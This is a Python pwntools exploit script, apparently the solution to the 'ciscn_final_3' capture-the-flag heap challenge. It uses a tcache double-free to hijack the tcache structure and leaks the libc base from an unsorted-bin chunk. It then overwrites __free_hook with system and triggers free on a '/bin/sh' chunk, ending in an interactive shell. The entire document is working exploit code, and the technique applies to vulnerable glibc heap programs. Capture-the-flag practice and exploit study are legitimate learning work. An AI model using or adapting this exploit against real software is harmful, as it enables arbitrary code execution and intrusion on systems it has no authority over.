from pwn import *

context.arch = 'amd64'
r = process(['../../libc/1864ld', './ciscn_final_3'],
            env={'LD_PRELOAD': '../../libc/1864'})
libc = ELF('../../libc/1864')


def malloc(index, size, content):
    r.recvuntil('choice > ')
    r.sendline('1')
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(str(size))
    r.recvline()
    r.send(content)
    r.recvuntil('gift :')
    return int(r.recvline(False), 16)


def free(index):
    r.recvuntil('choice > ')
    r.sendline('2')
    r.recvline()
    r.sendline(str(index))


# get Tcache address
tcache_addr = malloc(0, 0x30, 'da') - 0x11E60

# Tcache dup to get Tcache
free(0)
free(0)
malloc(1, 0x30, p64(tcache_addr))

# prepare for system('/bin/sh\x00')
malloc(2, 0x30, '/bin/sh\x00')

# control Tcache
malloc(3, 0x30, 'da')

# Tcache -> unsorted bin
[free(3) for i in range(8)]

# divide "0x250 Tcache unsorted bin chunk" into two parts
# so that libc address can fall into 0x70 and 0x80 sized entries
# and restore the counts for Tcache
malloc(4, 0x60, flat([0, 0]))

# malloc 0x80 to get the libc chunk in the Tcache entry 0x80
# and so we get the address of libc_base
libc_base = malloc(5, 0x70, '\x00') - 0x3EBCA0

# calculate all the address we need
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

# Tcache dup again write system into free
malloc(6, 0x10, '\x00')
free(6)
free(6)
malloc(7, 0x10, p64(free_hook))
malloc(8, 0x10, p64(free_hook))
malloc(9, 0x10, p64(system_addr))

# call free(2) to trigger system("/bin/sh\x00")
free(2)
r.interactive()
